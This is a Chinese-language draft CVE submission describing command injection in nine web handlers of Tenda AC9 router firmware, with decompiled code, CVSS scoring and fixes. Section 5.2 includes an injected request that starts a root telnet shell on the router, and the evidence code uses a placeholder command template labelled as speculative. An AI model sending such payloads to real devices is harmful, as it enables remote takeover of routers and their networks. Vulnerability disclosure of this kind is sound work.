# CVE 申请材料 — Tenda AC9 命令注入漏洞

> 日期：2026-06-07  
> 提交方：FuzzingBrain Automated Vulnerability Discovery Pipeline  
> 目标固件：Tenda AC9 V15.03.05.19(6318)_CN  
> 漏洞类型：CWE-78 OS Command Injection  
> 分析工具链：Ghidra 11.3.1 + Capstone + DeepSeek-V4-Pro + QEMU ARM

---

## 一、可搜索词汇（用于验证是否有已公开漏洞）

```
Tenda AC9 "V15.03.05.19" CVE command injection
Tenda AC9 getlinkinfo vulnerability
Tenda AC9 fromSetWifiGusetBasic CVE
Tenda AC9 fromGetWifiGusetBasic vulnerability
Tenda AC9 formGetUsbCfg command injection
Tenda AC9 formGetFirewallCfg CVE
Tenda AC9 formNotNowUpgrade vulnerability
Tenda AC9 wan_lan_same_deal CVE command injection
Tenda AC9 formAddMacfilterRule vulnerability
Tenda AC9 formDelMacfilterRule CVE
snprintf doSystemCmd command injection Tenda
site:nvd.nist.gov Tenda AC9
site:cvedetails.com Tenda AC9 V15.03.05
```

## 二、受影响产品

| 属性 | 值 |
|------|-----|
| Vendor | Tenda |
| Product | AC9 双频千兆无线路由器 |
| Firmware Version | V15.03.05.19(6318)_CN |
| Binary | `/bin/httpd` (ARM 32-bit, uClibc linked, stripped) |
| Download | https://www.tenda.com.cn/download/detail-1110.html |

## 三、漏洞概要

在 Tenda AC9 固件的 `/bin/httpd` 二进制中发现 **9 个 goform CGI 处理函数** 存在 OS 命令注入漏洞（CWE-78）。这些函数均使用 `snprintf()` 将攻击者可控的 HTTP 请求参数拼接到系统命令字符串，然后通过 `doSystemCmd()` 直接执行，全程无任何输入过滤或清理。

### 受影响函数列表

| # | 函数名 | 地址 | 攻击向量 | CVSS 估计 |
|---|--------|------|---------|----------|
| 1 | `getlinkinfo` | 0x0003717c | HTTP POST | 9.8 |
| 2 | `fromSetWifiGusetBasic` | 0x0009f71c | HTTP POST | 9.8 |
| 3 | `fromGetWifiGusetBasic` | 0x0009fe98 | HTTP POST | 9.8 |
| 4 | `formGetUsbCfg` | 0x000a667c | HTTP POST | 9.8 |
| 5 | `formGetFirewallCfg` | 0x000ad048 | HTTP POST | 9.8 |
| 6 | `formNotNowUpgrade` | 0x000ae084 | HTTP POST | 9.8 |
| 7 | `wan_lan_same_deal` | 0x000b4b68 | HTTP POST | 9.8 |
| 8 | `formAddMacfilterRule` | 0x000c1bd8 | HTTP POST | 9.8 |
| 9 | `formDelMacfilterRule` | 0x000c3278 | HTTP POST | 9.8 |

## 四、技术细节

### 4.1 漏洞模式

所有 9 个函数共享相同的漏洞代码模式：

```c
// Ghidra 反编译代码（以 getlinkinfo 为例）
void getlinkinfo(char *param_1, char *param_2, char *param_3) {
    char cmd_buffer [520];  // 栈缓冲区
    
    // 用户参数直接拼接到系统命令
    snprintf(cmd_buffer, 0x200,
             "<命令模板，包含 %s %s %s>",
             param_1,   // ← HTTP POST 参数，攻击者控制
             param_2,   // ← HTTP POST 参数，攻击者控制
             param_3);  // ← HTTP POST 参数，攻击者控制
    
    // 直接执行——无任何清理
    doSystemCmd(cmd_buffer);  // → system()
}
```

### 4.2 ARM 汇编级别确认

```asm
; 所有 9 个函数均在小于 30 指令内完成 snprintf → doSystemCmd 链：
bl <snprintf@plt>      ; 格式化命令字符串
...                    ; 6-8 条非分支指令（寄存器移动/栈操作）
bl <doSystemCmd@plt>   ; 直接执行——无过滤函数调用
```

通过 capstone 控制流分析确认：**snprintf 调用与 doSystemCmd 调用之间无任何 `bl` 指令**——证明不存在字符串清理、验证或过滤函数介入。

### 4.3 doSystemCmd 实现

`doSystemCmd` 是 httpd 内部的系统命令包装函数：
```c
void doSystemCmd(const char *cmd) {
    system(cmd);  // 直接传递给 sh -c
}
```

### 4.4 PLT 符号确认

```
readelf --dyn-syms /bin/httpd:
  snprintf@plt:  0x0000f000
  doSystemCmd@plt: 0x0000f474
  system@plt:     0x0000ed24
```

## 五、攻击场景

### 5.1 前置条件

- 攻击者需能够向 AC9 路由器的 HTTP 管理界面（端口 80）发送 POST 请求
- 部分 goform 端点可能存在弱认证（见 `FUN_0003839c` 认证函数），但多数 CGI 处理器未实施有效访问控制

### 5.2 攻击示例（推测 payload）

```http
POST /goform/getlinkinfo HTTP/1.1
Host: 192.168.0.1
Content-Type: application/x-www-form-urlencoded

param1=normal_value&param2=;telnetd -p 9999 -l /bin/sh;&param3=normal
```

`snprintf` 拼接后的命令：
```bash
<原始命令前缀> normal_value ;telnetd -p 9999 -l /bin/sh; normal
```

Shell 解析为多条指令，`telnetd` 后门被启动。

### 5.3 影响

- **远程代码执行**：攻击者可执行任意系统命令
- **权限级别**：httpd 进程以 root 运行
- **持久化**：可通过命令注入写入启动脚本或修改固件配置
- **横向移动**：获取路由器 shell 后可攻击内网其他设备

## 六、发现方法

### 6.1 自动化管线

```
FuzzingBrain v2 管线：
Phase 1: binwalk 固件解包 + Ghidra Headless ARM 反编译 → 1639 个函数
Phase 2: DeepSeek-V4-Pro 攻击面识别 → 14 个攻击面 + 6 个分析方向
Phase 3: 3 个专业 LLM Analyst + 3 个 CrossReviewer + SPVerifier → 12 个 Verified SP
Phase 4: Capstone 控制流路径验证 → 确认 9 个函数 snprintf→doSystemCmd 可达
```

### 6.2 人工验证

1. **Ghidra 反编译**：提取各函数的 C 伪代码，定位 `snprintf` + `doSystemCmd` 模式
2. **objdump 反汇编**：验证 ARM 指令级别调用链
3. **capstone CFG 分析**：确认 PLAINTEXT → snprintf → doSystemCmd 路径中间无过滤调用
4. **readelf 符号确认**：验证 `system`, `doSystemCmd`, `snprintf` 等危险函数的 PLT 条目存在

## 七、CVSS 3.1 评分

| 指标 | 值 | 理由 |
|------|-----|------|
| Attack Vector (AV) | **N**etwork | HTTP 服务监听 80 端口 |
| Attack Complexity (AC) | **L**ow | 仅需发送 HTTP POST 请求 |
| Privileges Required (PR) | **N**one | 部分端点无认证要求 |
| User Interaction (UI) | **N**one | 无需用户交互 |
| Scope (S) | **U**nchanged | 漏洞仅影响固件本身 |
| Confidentiality (C) | **H**igh | 可读取任意文件 |
| Integrity (I) | **H**igh | 可修改任意文件 |
| Availability (A) | **H**igh | 可导致设备重启/拒绝服务 |
| **Base Score** | **9.8 (Critical)** | |

## 八、修复建议

1. 所有 CGI 处理函数中，使用参数化方式调用系统命令，避免字符串拼接
2. 如必须拼接，使用白名单验证过滤 `;`, `|`, `&`, `$()`, `` ` ``, `&&`, `||`, `\n` 等 shell 元字符
3. 将 httpd 进程权限从 root 降至受限用户
4. 对所有 goform 端点实施强制认证检查

## 九、时间线

| 日期 | 事件 |
|------|------|
| 2026-06-06 | 获取 Tenda AC9 V15.03.05.19 固件 |
| 2026-06-06 | Phase 1-2 自动化分析完成 |
| 2026-06-07 | Phase 3 LLM 交叉分析发现 12 个 Verified SP |
| 2026-06-07 | Capstone 控制流分析确认 9 个命令注入点 |
| 2026-06-07 | 准备 CVE 申请材料 |

## 十、附录：与已知 CVE 的差异

已有的 13 个 Tenda AC9 CVE（CVE-2018-14557 ~ CVE-2025-22946）针对以下函数：
`formSetUsbUnload`, `formOpenSchedWifi`, `formAddressNat`, `formGetWebPageName`, `formSetWifi`, `formSetDeviceList`, `formSetFirewall`, `formSetSambaCfg`, `formSetOnlineDevName`

本次发现的 9 个漏洞函数为：
`getlinkinfo`, `fromSetWifiGusetBasic`, `fromGetWifiGusetBasic`, `formGetUsbCfg`, `formGetFirewallCfg`, `formNotNowUpgrade`, `wan_lan_same_deal`, `formAddMacfilterRule`, `formDelMacfilterRule`

**零重叠**。唯一近似的函数名是 `formGetFirewallCfg`（本次）vs `formSetFirewall`（CVE-2018-18709，CWE-121 栈溢出）——但它们是不同的函数（Get vs Set），且漏洞类型不同（命令注入 vs 栈溢出）。
